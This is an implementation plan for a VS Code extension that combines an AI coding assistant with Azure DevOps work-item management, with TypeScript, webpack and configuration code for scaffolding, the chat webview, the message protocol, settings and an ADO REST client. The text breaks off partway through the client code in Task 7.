# ADO Code — VS Code Extension Implementation Plan

> **For Hermes:** Use subagent-driven-development skill to implement this plan task-by-task.
>
> **Review status:** Critically reviewed by an independent agent (2026-08-02).
> CRITICAL/HIGH findings fixed: shell-injection in git commands (now `execFile`
> arg arrays), composition root added (`src/services.ts`), tree-view data path
> wired, streaming accumulation, CSP + DOMPurify, selectWorkItem context chain,
> Task 11/14 ordering, command argument shapes, LLM provider tests. Remaining
> open items are tracked in the Risks/Open Questions sections.
>
> **Phase 4 (Tasks 21-28) added 2026-08-02:** external agent orchestration
> (Claude Code / Codex / OpenCode / Hermes / Pi / OpenClaw), tool calling with
> agentic loop, multi-turn instructions and session resume, work verification
> check-back, and a task-detail review + clarification feedback loop (ask the
> BA/tester who created the task). Clarification Q&A on the thread flows into
> the chat system prompt, the agent handoff prompt, and the `get_work_item`
> tool result, so downstream AI never builds against an unclarified spec.
> Grounded in the hermes-agent skills for claude-code / codex / opencode CLI
> contracts.

**Goal:** Build a VS Code extension that provides an AI coding assistant (similar to Cline/Copilot Chat) with integrated Azure DevOps work item management — fetch tasks, view details, review full task detail (description, acceptance criteria, discussion), request clarification from the task creator when details are missing, get AI assistance scoped to your assigned work items, enforce git-based task workflows (auto-create branch on pickup, update CHANGELOG.md on completion), support OpenAI-compatible and Anthropic-compatible LLM endpoints, and orchestrate installed external agent CLIs (Claude Code, Codex, OpenCode, Hermes, Pi, OpenClaw) — delegating ADO tasks to them, driving them with tool calling and multi-turn instructions, and checking back on the work they produce.

**Architecture:** Two-layer architecture: (1) Extension Host (Node.js/TypeScript) handles Azure DevOps REST API calls, LLM API calls, editor interactions, and message routing. (2) Webview Panel (React/TypeScript) renders the chat UI and ADO task list sidebar. Communication uses VS Code's `postMessage` bridge. The extension uses a sidebar WebViewView for the main chat and a separate tree view for ADO tasks.

**Tech Stack:** TypeScript, VS Code Extension API, React 18, Webpack (bundling webview), Azure DevOps REST API v7.1 (PAT auth), LLM API with provider abstraction (OpenAI-compatible + Anthropic-compatible, configurable endpoint, tool calling via agentic loop), external agent CLI orchestration (Claude Code / Codex / OpenCode / Hermes / Pi / OpenClaw adapters via child_process).

---

## Phase 1: Project Scaffolding (Tasks 1-6)

### Task 1: Initialize VS Code Extension Project

**Objective:** Create the base project structure with package.json, tsconfig, and build tooling.

**Files:**
- Create: `package.json`
- Create: `tsconfig.json`
- Create: `.vscodeignore`
- Create: `.gitignore`
- Create: `README.md`

**Step 1: Create package.json**

```json
{
  "name": "ado-code",
  "displayName": "ADO Code",
  "description": "AI coding assistant with Azure DevOps integration",
  "version": "0.0.1",
  "publisher": "steelburn",
  "engines": {
    "vscode": "^1.85.0"
  },
  "categories": ["Other"],
  "activationEvents": [],
  "main": "./out/extension.js",
  "contributes": {
    "commands": [],
    "configuration": {
      "title": "ADO Code",
      "properties": {}
    }
  },
  "scripts": {
    "vscode:prepublish": "npm run compile",
    "compile": "tsc -p ./",
    "watch": "tsc -watch -p ./",
    "lint": "eslint src --ext ts"
  },
  "devDependencies": {
    "@types/node": "^20.11.0",
    "@types/vscode": "^1.85.0",
    "@typescript-eslint/eslint-plugin": "^7.0.0",
    "@typescript-eslint/parser": "^7.0.0",
    "eslint": "^8.56.0",
    "typescript": "^5.3.3"
  }
}
```

**Step 2: Create tsconfig.json**

```json
{
  "compilerOptions": {
    "module": "commonjs",
    "target": "ES2022",
    "lib": ["ES2022"],
    "outDir": "out",
    "rootDir": "src",
    "sourceMap": true,
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "resolveJsonModule": true,
    "declaration": true,
    "declarationMap": true
  },
  "include": ["src/**/*"],
  "exclude": ["node_modules", "src/webview-ui"]
}
```

**Step 3: Create .vscodeignore**

```
.vscode/**
.vscode-test/**
src/**
node_modules/**
tsconfig.json
**/*.ts
**/*.map
```

**Step 4: Create .gitignore**

```
out/
node_modules/
.vscode-test/
*.vsix
dist/
```

**Step 5: Create basic extension entry point**

Create `src/extension.ts`:

```typescript
import * as vscode from 'vscode';

export function activate(context: vscode.ExtensionContext) {
  console.log('ADO Code extension is now active!');
}

export function deactivate() {}
```

**Step 6: Install dependencies and verify compilation**

Run: `npm install && npm run compile`
Expected: Clean compilation, `out/extension.js` exists

**Step 7: Commit**

```bash
git add -A
git commit -m "chore: initialize VS Code extension project scaffolding"
```

---

### Task 2: Set Up Webview Build Pipeline (Webpack + React)

**Objective:** Configure webpack to bundle the React webview UI separately from the extension host code.

**Files:**
- Create: `webpack.config.js`
- Create: `src/webview-ui/package.json`
- Create: `src/webview-ui/tsconfig.json`
- Create: `src/webview-ui/webpack.config.js`
- Create: `src/webview-ui/src/index.tsx`
- Create: `src/webview-ui/src/App.tsx`
- Create: `src/webview-ui/public/index.html`
- Modify: `package.json` (add webview build scripts)

**Step 1: Create webview-ui/package.json**

```json
{
  "name": "ado-code-webview",
  "version": "0.0.1",
  "private": true,
  "dependencies": {
    "react": "^18.2.0",
    "react-dom": "^18.2.0"
  },
  "devDependencies": {
    "@types/react": "^18.2.0",
    "@types/react-dom": "^18.2.0",
    "css-loader": "^6.8.0",
    "html-webpack-plugin": "^5.5.0",
    "style-loader": "^3.3.0",
    "ts-loader": "^9.5.0",
    "typescript": "^5.3.3",
    "webpack": "^5.89.0",
    "webpack-cli": "^5.1.0"
  },
  "scripts": {
    "build": "webpack --mode production",
    "watch": "webpack --mode development --watch"
  }
}
```

**Step 2: Create webview-ui/webpack.config.js**

```javascript
const path = require('path');
const HtmlWebpackPlugin = require('html-webpack-plugin');

module.exports = {
  entry: './src/index.tsx',
  output: {
    path: path.resolve(__dirname, '../../webview-ui-dist'),
    filename: 'webview.js',
    clean: true,
  },
  resolve: {
    extensions: ['.ts', '.tsx', '.js', '.jsx'],
  },
  module: {
    rules: [
      {
        test: /\.tsx?$/,
        use: 'ts-loader',
        exclude: /node_modules/,
      },
      {
        test: /\.css$/,
        use: ['style-loader', 'css-loader'],
      },
    ],
  },
  plugins: [
    new HtmlWebpackPlugin({
      template: './public/index.html',
    }),
  ],
};
```

**Step 3: Create webview-ui tsconfig.json**

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "lib": ["ES2022", "DOM", "DOM.Iterable"],
    "module": "ESNext",
    "moduleResolution": "node",
    "jsx": "react-jsx",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "outDir": "../../webview-ui-dist",
    "rootDir": "src"
  },
  "include": ["src/**/*"]
}
```

**Step 4: Create minimal React app**

`src/webview-ui/public/index.html`:
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ADO Code</title>
</head>
<body>
  <div id="root"></div>
</body>
</html>
```

`src/webview-ui/src/index.tsx`:
```tsx
import React from 'react';
import { createRoot } from 'react-dom/client';
import App from './App';

const root = createRoot(document.getElementById('root')!);
root.render(<App />);
```

`src/webview-ui/src/App.tsx`:
```tsx
import React from 'react';

function App() {
  return <div><h1>ADO Code</h1><p>Extension loaded.</p></div>;
}

export default App;
```

**Step 5: Update root package.json scripts**

Add to scripts section:
```json
"build:webview": "cd src/webview-ui && npm install && npm run build",
"build:all": "npm run compile && npm run build:webview",
"watch:webview": "cd src/webview-ui && npm run watch"
```

**Step 6: Build and verify**

Run: `npm run build:all`
Expected: `webview-ui-dist/index.html` and `webview-ui-dist/webview.js` exist

**Step 7: Commit**

```bash
git add -A
git commit -m "feat: set up React webview build pipeline with webpack"
```

---

### Task 3: Create WebViewView Provider for Chat Panel

**Objective:** Register a sidebar WebViewView that loads the React app and handles message passing between extension host and webview.

**Files:**
- Create: `src/webview/ChatViewProvider.ts`
- Modify: `src/extension.ts`
- Modify: `package.json` (add viewsContainers and views contributions)

**Step 1: Write failing test — verify ChatViewProvider class exists**

Create `src/test/suite/webview/chatViewProvider.test.ts`:
```typescript
import * as assert from 'assert';
import { ChatViewProvider } from '../../../webview/ChatViewProvider';

suite('ChatViewProvider', () => {
  test('can be instantiated', () => {
    // H15 fix: match Task 3's 1-param constructor. Task 8 changes the
    // signature to (extensionUri, services, context, onItemsFetched?) —
    // update this test there.
    const provider = new ChatViewProvider({} as any);
    assert.ok(provider);
  });
});
```

Run: `npm test` — Expected: FAIL (module not found)

**Step 2: Implement ChatViewProvider**

Create `src/webview/ChatViewProvider.ts`:
```typescript
import * as vscode from 'vscode';
import * as path from 'path';
import * as fs from 'fs';

export class ChatViewProvider implements vscode.WebviewViewProvider {
  public static readonly viewType = 'adoCode.chat';
  private _view?: vscode.WebviewView;

  constructor(private readonly _extensionUri: vscode.Uri) {}

  public resolveWebviewView(
    webviewView: vscode.WebviewView,
    _context: vscode.WebviewViewResolveContext,
    _token: vscode.CancellationToken
  ) {
    this._view = webviewView;

    webviewView.webview.options = {
      enableScripts: true,
      localResourceRoots: [this._extensionUri],
    };

    webviewView.webview.html = this._getHtmlForWebview(webviewView.webview);

    // Handle messages from webview
    webviewView.webview.onDidReceiveMessage(
      async (message) => {
        switch (message.type) {
          case 'userMessage':
            // Will be wired to LLM in later task; `done: true` is required by
            // the typed protocol added in Task 4
            webviewView.webview.postMessage({
              type: 'assistantMessage',
              content: 'Echo: ' + message.content,
              done: true,
            });
            break;
        }
      },
      undefined,
      []
    );
  }

  public postMessage(message: any) {
    this._view?.webview.postMessage(message);
  }

  private _getHtmlForWebview(webview: vscode.Webview): string {
    const scriptUri = webview.asWebviewUri(
      vscode.Uri.joinPath(this._extensionUri, 'webview-ui-dist', 'webview.js')
    );
    // CSP: default-src 'none' + explicit allowlists. Without this, VS Code logs
    // a warning and any HTML injected into the webview (e.g. markdown render of
    // LLM output) can execute scripts. The nonce on the script tag makes the
    // inline CSP workable.
    const nonce = getNonce();

    return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'none'; style-src ${webview.cspSource} 'unsafe-inline'; script-src 'nonce-${nonce}'; img-src ${webview.cspSource} data:;">
  <title>ADO Code</title>
</head>
<body>
  <div id="root"></div>
  <script nonce="${nonce}" src="${scriptUri}"></script>
</body>
</html>`;
  }
}

function getNonce(): string {
  const possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let text = '';
  for (let i = 0; i < 32; i++) {
    text += possible.charAt(Math.floor(Math.random() * possible.length));
  }
  return text;
}
```

**Step 3: Register provider in extension.ts**

```typescript
import * as vscode from 'vscode';
import { ChatViewProvider } from './webview/ChatViewProvider';

export function activate(context: vscode.ExtensionContext) {
  const chatProvider = new ChatViewProvider(context.extensionUri);
  context.subscriptions.push(
    vscode.window.registerWebviewViewProvider(
      ChatViewProvider.viewType,
      chatProvider
    )
  );
}

export function deactivate() {}
```

**Step 4: Register sidebar view in package.json**

Add to `contributes`:
```json
"viewsContainers": {
  "activitybar": [
    {
      "id": "adoCode",
      "title": "ADO Code",
      "icon": "$(comment-discussion)"
    }
  ]
},
"views": {
  "adoCode": [
    {
      "type": "webview",
      "id": "adoCode.chat",
      "name": "Chat"
    }
  ]
}
```

**Step 5: Run tests and verify**

Run: `npm run compile && npm test`
Expected: PASS

**Step 6: Commit**

```bash
git add -A
git commit -m "feat: add ChatViewProvider with sidebar WebViewView"
```

---

### Task 4: Create Message Protocol Between Extension and Webview

**Objective:** Define a typed message protocol for all communication between extension host and webview UI.

**Files:**
- Create: `src/shared/messages.ts` (shared types)
- Create: `src/webview-ui/src/types.ts` (copy for webview)
- Modify: `src/webview/ChatViewProvider.ts` (use typed messages)

**Step 1: Define message types**

Create `src/shared/messages.ts`:
```typescript
// Messages from Webview → Extension Host
export type WebviewToExtensionMessage =
  | { type: 'userMessage'; content: string; context?: MessageContext }
  | { type: 'fetchWorkItems' }
  | { type: 'selectWorkItem'; workItemId: number }
  | { type: 'startTask'; workItemId: number; title: string }
  | { type: 'updateWorkItem'; workItemId: number; fields: Record<string, any> }
  | { type: 'addComment'; workItemId: number; text: string }
  | { type: 'getConfig' }
  | { type: 'updateConfig'; config: Partial<ExtensionConfig> };

// Messages from Extension Host → Webview
export type ExtensionToWebviewMessage =
  | { type: 'assistantMessage'; content: string; done: boolean }
  | { type: 'workItems'; items: WorkItemSummary[] }
  | { type: 'workItemDetail'; item: WorkItemDetail }
  | { type: 'gitStatus'; isGitRepo: boolean; currentBranch: string | null; branchCreated: string | null }
  | { type: 'changelogUpdated'; filePath: string }
  | { type: 'modeChanged'; mode: 'inline' | 'plan' | 'act' }
  // H9: tool-call cards for the webview (agentic loop streaming)
  | { type: 'toolCall'; call: { id: string; name: string; arguments: Record<string, any> } }
  | { type: 'toolResult'; callId: string; content: string }
  | { type: 'planReady'; plan: string } // plan mode: "Begin implementation" button
  | { type: 'config'; config: ExtensionConfig }
  | { type: 'error'; message: string }
  | { type: 'loading'; loading: boolean };

// Shared types
export interface MessageContext {
  activeFile?: string;
  selectedText?: string;
  workItemId?: number;
}

export interface WorkItemSummary {
  id: number;
  title: string;
  state: string;
  assignedTo: string;
  workItemType: string;
}

export interface WorkItemDetail extends WorkItemSummary {
  description: string;
  acceptanceCriteria: string;
  tags: string;
  areaPath: string;
  iterationPath: string;
  comments: WorkItemComment[];
}

export interface WorkItemComment {
  id: number;
  text: string;
  createdBy: string;
  createdDate: string;
}

// Shared work-item context used by the chat system prompt (Task 13),
// agent handoff prompt (Task 25), and task completion hook (Task 11).
// Defined here (Task 4) so earlier tasks can reference it without forward deps.
export interface WorkItemContext {
  id: number;
  title: string;
  state?: string;
  description?: string;
  acceptanceCriteria?: string;
  tags?: string;
  comments?: Array<{ author: string; text: string; date?: string }>;
}

export interface ExtensionConfig {
  // M-10 fix: mirror the FULL Task 5 settings surface (no drift).
  organizations: Array<{ name: string; url: string; project: string }>;
  adoOrganization: string;
  adoProject: string;
  adoServerUrl: string;
  adoPat: string;
  llmProvider: string;
  llmApiUrl: string;
  llmApiKey: string;
  llmModel: string;
  mode: 'inline' | 'plan' | 'act';
  agentsEnabled: string[];
  actToolBudget: number;
  actTerminalAllowlist: string[];
  gitRequireGitRepo: boolean;
  gitCreateBranchOnTaskStart: boolean;
  gitRequireCleanTree: boolean;
  gitPrOnCompletion: boolean;
  changelogEnabled: boolean;
  changelogAutoCommit: boolean;
  changelogPostToAdo: boolean;
  adoClarificationState: string;
  adoWarnOnSparseTask: boolean;
}
```

**Step 2: Update ChatViewProvider to use typed messages**

Modify `src/webview/ChatViewProvider.ts` to import and use these types.

**Step 3: Copy types to webview-ui**

Create `src/webview-ui/src/types.ts` as a copy of `src/shared/messages.ts`.

**Step 4: Update React App to send/receive messages**

Modify `src/webview-ui/src/App.tsx`:
```tsx
import React, { useState, useEffect, useRef } from 'react';
import { ExtensionToWebviewMessage, WebviewToExtensionMessage } from './types';

declare function acquireVsCodeApi(): {
  postMessage(msg: WebviewToExtensionMessage): void;
  getState(): any;
  setState(state: any): void;
};

const vscode = acquireVsCodeApi();

function App() {
  const [messages, setMessages] = useState<{role: string; content: string}[]>([]);
  const [input, setInput] = useState('');

  useEffect(() => {
    window.addEventListener('message', (event: MessageEvent<ExtensionToWebviewMessage>) => {
      const msg = event.data;
      switch (msg.type) {
        case 'assistantMessage':
          // Stream accumulation: append chunks to the CURRENT assistant bubble,
          // and only seal it when done:true arrives. Prevents N bubbles per turn.
          setMessages(prev => {
            if (msg.done) {
              return prev; // bubble already final; message stream ended
            }
            const last = prev[prev.length - 1];
            if (last && last.role === 'assistant') {
              const updated = [...prev];
              updated[updated.length - 1] = { role: 'assistant', content: last.content + msg.content };
              return updated;
            }
            return [...prev, { role: 'assistant', content: msg.content }];
          });
          break;
      }
    });
  }, []);

  const sendMessage = () => {
    if (!input.trim()) return;
    setMessages(prev => [...prev, { role: 'user', content: input }]);
    vscode.postMessage({ type: 'userMessage', content: input });
    setInput('');
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100vh', padding: '8px' }}>
      <div style={{ flex: 1, overflow: 'auto' }}>
        {messages.map((m, i) => (
          <div key={i} style={{ margin: '4px 0', padding: '8px', borderRadius: '4px',
            background: m.role === 'user' ? 'var(--vscode-editor-background)' : 'var(--vscode-sideBar-background)' }}>
            <strong>{m.role === 'user' ? 'You' : 'ADO Code'}:</strong> {m.content}
          </div>
        ))}
      </div>
      <div style={{ display: 'flex', gap: '4px' }}>
        <input value={input} onChange={e => setInput(e.target.value)}
          onKeyDown={e => e.key === 'Enter' && sendMessage()}
          style={{ flex: 1 }} placeholder="Ask anything..." />
        <button onClick={sendMessage}>Send</button>
      </div>
    </div>
  );
}

export default App;
```

**Step 5: Build and verify**

Run: `npm run build:all`
Expected: Clean build

**Step 6: Commit**

```bash
git add -A
git commit -m "feat: add typed message protocol between extension and webview"
```

---

### Task 5: Add Configuration Schema for ADO and LLM Settings

**Objective:** Register VS Code settings for Azure DevOps connection and LLM API configuration.

**Files:**
- Modify: `package.json` (contributes.configuration)
- Create: `src/config/settings.ts`

**Step 1: Add configuration to package.json**

Add to `contributes.configuration.properties`:
```json
{
  "adoCode.organizations": {
    "type": "array",
    "default": [],
    "description": "ADO organizations the developer works with: [{ \"name\": \"mycompany\", \"url\": \"https://dev.azure.com/mycompany\", \"project\": \"MyProject\" }]. The ACTIVE org is picked per workspace (workspaceState), see adoCode.adoOrganization/adoCode.adoProject (Q1 resolution)."
  },
  "adoCode.adoOrganization": {
    "type": "string",
    "default": "",
    "description": "Active Azure DevOps organization name for this workspace (e.g., 'mycompany')"
  },
  "adoCode.adoProject": {
    "type": "string",
    "default": "",
    "description": "Active Azure DevOps project name for this workspace"
  },
  "adoCode.adoServerUrl": {
    "type": "string",
    "default": "",
    "description": "Optional ADO Server (on-premises) base URL, e.g. 'https://ado.corp.local/tfs/DefaultCollection'. Empty = cloud ADO Services (https://dev.azure.com/{org}). Used verbatim when set (Q2 resolution)."
  },
  "adoCode.adoPat": {
    "type": "string",
    "default": "",
    "description": "Azure DevOps Personal Access Token",
    "format": "password"
  },
  "adoCode.llmProvider": {
    "type": "string",
    "default": "openai",
    "enum": ["openai", "anthropic"],
    "enumDescriptions": [
      "OpenAI-compatible API (OpenAI, Ollama, LM Studio, vLLM, OpenRouter, etc. — not Azure OpenAI; see M13)",
      "Anthropic Messages API (Claude, Amazon Bedrock, self-hosted Anthropic-compatible)"
    ],
    "description": "LLM provider type — determines API format and authentication"
  },
  "adoCode.llmApiUrl": {
    "type": "string",
    "default": "https://api.openai.com/v1",
    "description": "LLM API base URL. For Anthropic: use https://api.anthropic.com. For self-hosted: use your local endpoint."
  },
  "adoCode.llmApiKey": {
    "type": "string",
    "default": "",
    "description": "LLM API key",
    "format": "password"
  },
  "adoCode.llmModel": {
    "type": "string",
    "default": "gpt-4o",
    "description": "LLM model name (e.g., gpt-4o, claude-sonnet-4-20250514, llama3, etc.)"
  },
  "adoCode.git.requireGitRepo": {
    "type": "boolean",
    "default": true,
    "description": "Block task pickup when the workspace is not inside a git repository"
  },
  "adoCode.git.createBranchOnTaskStart": {
    "type": "boolean",
    "default": true,
    "description": "Automatically create a feature/ADO-<id>-<slug> branch when picking up a work item"
  },
  "adoCode.git.requireCleanTree": {
    "type": "boolean",
    "default": false,
    "description": "Warn and require confirmation when switching branches with uncommitted changes"
  },
  "adoCode.git.prOnCompletion": {
    "type": "boolean",
    "default": false,
    "description": "On task completion, offer to push the branch and create a PR via gh CLI (Q5 resolution — opt-in)"
  },
  "adoCode.mode": {
    "type": "string",
    "default": "inline",
    "enum": ["inline", "plan", "act"],
    "enumDescriptions": [
      "Streaming answer; tool calls shown inline, mutating tools require approval",
      "Read-only tools only; produces a plan; 'Begin implementation' switches to act",
      "Autonomous agentic loop with auto-approval of mutating tools (tool budget + terminal allowlist)"
    ],
    "description": "LLM tool-use mode (Q8 resolution)"
  },
  "adoCode.act.toolBudget": {
    "type": "number",
    "default": 25,
    "description": "Max tool calls per act-mode turn"
  },
  "adoCode.act.terminalAllowlist": {
    "type": "array",
    "items": { "type": "string" },
    "default": ["npm test", "npm run lint", "git diff", "git status"],
    "description": "Allowed command prefixes for run_terminal_command in act mode"
  },
  "adoCode.changelog.enabled": {
    "type": "boolean",
    "default": true,
    "description": "Create/update CHANGELOG.md when a work item is completed (state Done/Closed)"
  },
  "adoCode.changelog.autoCommit": {
    "type": "boolean",
    "default": true,
    "description": "Commit the CHANGELOG.md update automatically on task completion"
  },
  "adoCode.changelog.postToAdo": {
    "type": "boolean",
    "default": true,
    "description": "Post the changelog entry as a comment on the Azure DevOps work item when it is completed"
  }
}
```
**Provider mapping:**
- `openai` provider uses `POST /chat/completions` with `Authorization: Bearer <key>`. Works with: OpenAI, Ollama, LM Studio, vLLM, OpenRouter, Together, Fireworks, Groq, Mistral, and any OpenAI-compatible endpoint.
- `anthropic` provider uses `POST /v1/messages` with `x-api-key: <key>` and `anthropic-version` header. Works with: Anthropic direct, Amazon Bedrock (via proxy), self-hosted Anthropic-compatible servers.
- M13: Azure OpenAI is NOT a drop-in OpenAI-compatible endpoint — it requires an `api-version` query param and `api-key` header. The OpenAI adapter does not implement Azure auth, so the setting description must NOT claim Azure support. If Azure is needed later, add an `adoCode.llm.azure` flag (api-version + api-key header) to the OpenAI adapter.

**Step 2: Create settings helper**

Create `src/config/settings.ts`:
```typescript
import * as vscode from 'vscode';

export type LlmProvider = 'openai' | 'anthropic';

export interface AdoCodeSettings {
  organizations: Array<{ name: string; url: string; project: string }>;
  adoOrganization: string;
  adoProject: string;
  adoServerUrl: string;
  adoPat: string;
  llmProvider: LlmProvider;
  llmApiUrl: string;
  llmApiKey: string;
  llmModel: string;
  mode: 'inline' | 'plan' | 'act';
  actToolBudget: number;
  actTerminalAllowlist: string[];
  gitRequireGitRepo: boolean;
  gitCreateBranchOnTaskStart: boolean;
  gitRequireCleanTree: boolean;
  gitPrOnCompletion: boolean;
  changelogEnabled: boolean;
  changelogAutoCommit: boolean;
  changelogPostToAdo: boolean;
  adoClarificationState: string;
  adoWarnOnSparseTask: boolean;
}

export function getSettings(): AdoCodeSettings {
  const config = vscode.workspace.getConfiguration('adoCode');
  return {
    organizations: config.get<Array<{ name: string; url: string; project: string }>>('organizations', []),
    adoOrganization: config.get<string>('adoOrganization', ''),
    adoProject: config.get<string>('adoProject', ''),
    adoServerUrl: config.get<string>('adoServerUrl', ''),
    adoPat: config.get<string>('adoPat', ''),
    llmProvider: config.get<LlmProvider>('llmProvider', 'openai'),
    llmApiUrl: config.get<string>('llmApiUrl', 'https://api.openai.com/v1'),
    llmApiKey: config.get<string>('llmApiKey', ''),
    llmModel: config.get<string>('llmModel', 'gpt-4o'),
    mode: config.get<'inline' | 'plan' | 'act'>('mode', 'inline'),
    actToolBudget: config.get<number>('act.toolBudget', 25),
    actTerminalAllowlist: config.get<string[]>('act.terminalAllowlist', ['npm test', 'npm run lint', 'git diff', 'git status']),
    gitRequireGitRepo: config.get<boolean>('git.requireGitRepo', true),
    gitCreateBranchOnTaskStart: config.get<boolean>('git.createBranchOnTaskStart', true),
    gitRequireCleanTree: config.get<boolean>('git.requireCleanTree', false),
    gitPrOnCompletion: config.get<boolean>('git.prOnCompletion', false),
    changelogEnabled: config.get<boolean>('changelog.enabled', true),
    changelogAutoCommit: config.get<boolean>('changelog.autoCommit', true),
    changelogPostToAdo: config.get<boolean>('changelog.postToAdo', true),
    adoClarificationState: config.get<string>('ado.clarificationState', 'Blocked'),
    adoWarnOnSparseTask: config.get<boolean>('ado.warnOnSparseTask', true),
  };
}
```

**Step 3: Org switching helper (Q1 resolution)**

Add to `src/config/settings.ts`:
```typescript
/** Select which configured organization is active for this workspace. */
export async function selectActiveOrganization(context: vscode.ExtensionContext): Promise<void> {
  const settings = getSettings();
  if (settings.organizations.length === 0) return;
  const current = getActiveOrg(context, settings);
  const pick = await vscode.window.showQuickPick(
    settings.organizations.map(o => ({ label: o.name, description: o.project, detail: o.url })),
    { placeHolder: `Active org: ${current?.name ?? 'none'}`, ignoreFocusOut: true }
  );
  if (!pick) return;
  const org = settings.organizations.find(o => o.name === pick.label);
  if (!org) return;
  // Persist BOTH the org name and its default project so createServices
  // (Task 8) reads consistent values.
  await context.workspaceState.update('adoCode.activeOrgName', org.name);
  await context.workspaceState.update('adoCode.activeProject', org.project);
}

/** Resolve the ACTIVE org + project (workspaceState first, settings fallback). */
export function getActiveOrg(context: vscode.ExtensionContext, settings: AdoCodeSettings): { name: string; project: string; url: string } {
  const name = context.workspaceState.get<string>('adoCode.activeOrgName', settings.adoOrganization);
  const project = context.workspaceState.get<string>('adoCode.activeProject', settings.adoProject);
  const configured = settings.organizations.find(o => o.name === name);
  return {
    name,
    project,
    // C10: per-org URL wins; fall back to global server URL / cloud.
    // H-4 fix: the cloud fallback MUST use the ACTIVE org name, not the
    // settings default — getActiveOrgBaseUrl(settings, name).
    url: configured?.url || getActiveOrgBaseUrl(settings, name),
  };
}

/** Resolve the ACTIVE org base URL: per-org configured URL wins (getActiveOrg),
 * else global adoServerUrl (on-prem, Q2), else cloud from the ACTIVE org name
 * (H-4: pass the active name explicitly — settings.adoOrganization may be stale). */
export function getActiveOrgBaseUrl(settings: AdoCodeSettings, activeName?: string): string {
  if (settings.adoServerUrl) return settings.adoServerUrl;
  return `https://dev.azure.com/${activeName ?? settings.adoOrganization}`;
}
```
(Note: the active org is persisted per workspace; `AdoClient` is recreated on
switch by `createServices` in Task 8, which now calls `getActiveOrg()`.)

**Step 4: Verify**

Run: `npm run compile`
Expected: Clean compilation

**Step 5: Commit**

```bash
git add -A
git commit -m "feat: add configuration schema for ADO and LLM settings"
```

---

### Task 6: Add Linting and Test Infrastructure

**Objective:** Set up ESLint, Mocha test runner, and basic test structure.

**Files:**
- Create: `.eslintrc.json`
- Create: `src/test/suite/index.ts`
- Create: `src/test/runTest.ts`
- Modify: `package.json` (add test script and dependencies)

**Step 1: Add test dependencies**

Add to devDependencies in root package.json:
```json
"@vscode/test-electron": "^2.3.8",
"glob": "^10.3.10",
"mocha": "^10.2.0"
```

Add scripts:
```json
"test": "node ./out/test/runTest.js"
```

**Step 2: Create ESLint config**

Create `.eslintrc.json`:
```json
{
  "root": true,
  "parser": "@typescript-eslint/parser",
  "parserOptions": {
    "ecmaVersion": 2022,
    "sourceType": "module"
  },
  "plugins": ["@typescript-eslint"],
  "extends": [
    "eslint:recommended",
    "plugin:@typescript-eslint/recommended"
  ],
  "rules": {
    "@typescript-eslint/no-unused-vars": "warn",
    "@typescript-eslint/no-explicit-any": "warn"
  }
}
```

**Step 3: Create test infrastructure**

Create `src/test/runTest.ts`:
```typescript
import * as path from 'path';
import { runTests } from '@vscode/test-electron';

async function main() {
  const extensionDevelopmentPath = path.resolve(__dirname, '../../');
  const extensionTestsPath = path.resolve(__dirname, './suite/index');

  await runTests({ extensionDevelopmentPath, extensionTestsPath });
}

main();
```

Create `src/test/suite/index.ts`:
```typescript
import * as path from 'path';
import Mocha from 'mocha';
import { glob } from 'glob';

export async function run(): Promise<void> {
  const mocha = new Mocha({ ui: 'tdd', color: true });
  const testsRoot = path.resolve(__dirname, '.');

  const files = await glob('**/**.test.js', { cwd: testsRoot });
  files.forEach(f => mocha.addFile(path.resolve(testsRoot, f)));

  return new Promise<void>((resolve, reject) => {
    mocha.run(failures => {
      if (failures > 0) reject(new Error(`${failures} tests failed`));
      else resolve();
    });
  });
}
```

**Step 4: Verify lint**

Run: `npx eslint src --ext ts`
Expected: No errors (may have warnings)

**Step 5: Commit**

```bash
git add -A
git commit -m "chore: add ESLint and Mocha test infrastructure"
```

---

## Phase 2: Azure DevOps Integration (Tasks 7-14)

### Task 7: Implement ADO REST API Client

**Objective:** Create a typed HTTP client for Azure DevOps REST API with PAT authentication.

**Files:**
- Create: `src/ado/client.ts`
- Create: `src/ado/types.ts`
- Create: `src/test/suite/ado/client.test.ts`

**Step 1: Define ADO API types**

Create `src/ado/types.ts`:
```typescript
export interface AdoWorkItem {
  id: number;
  fields: {
    'System.Title': string;
    'System.State': string;
    'System.AssignedTo': { displayName: string; uniqueName: string };
    'System.WorkItemType': string;
    'System.Description'?: string;
    'Microsoft.VSTS.Common.AcceptanceCriteria'?: string;
    'System.Tags'?: string;
    'System.AreaPath': string;
    'System.IterationPath': string;
    // C-5 fix: declared HERE (Task 7) — getWorkItemWithDiscussion in this task
    // reads System.CreatedBy; Task 28's clarification flow needs it too.
    'System.CreatedBy'?: { displayName: string; uniqueName: string };
    'System.CreatedDate'?: string;
    'System.ChangedDate'?: string;
  };
  _links: {
    self: { href: string };
    html: { href: string };
  };
}

export interface AdoWorkItemReference {
  id: number;
  url: string;
}

export interface WiqlResult {
  workItems: AdoWorkItemReference[];
}

export interface AdoComment {
  id: number;
  text: string;
  createdBy: { displayName: string };
  createdDate: string;
}
```

**Step 2: Implement API client**

Create `src/ado/client.ts`:
```typescript
import * as vscode from 'vscode';
import { AdoWorkItem, AdoWorkItemReference, WiqlResult, AdoComment } from './types';

export class AdoClient {
  private baseUrl: string;
  private headers: Record<string, string>;

  constructor(organization: string, pat: string, serverUrl?: string) {
    if (!organization || !pat) {
      throw new Error('AdoClient requires organization and PAT');
    }
    // Q2 resolution: serverUrl (on-prem ADO Server) wins when provided;
    // otherwise build the cloud URL from the org name.
    this.baseUrl = serverUrl && serverUrl.trim()
      ? serverUrl.replace(/\/+$/, '')
      : `https://dev.azure.com/${organization}`;
    const encodedPat = Buffer.from(`:${pat}`).toString('base64');
    this.headers = {
      'Authorization': `Basic ${encodedPat}`,
      'Content-Type': 'application/json',
      'Accept': 'application/json',
    };
  }

  async getWorkItemsAssignedTo(
    project: string
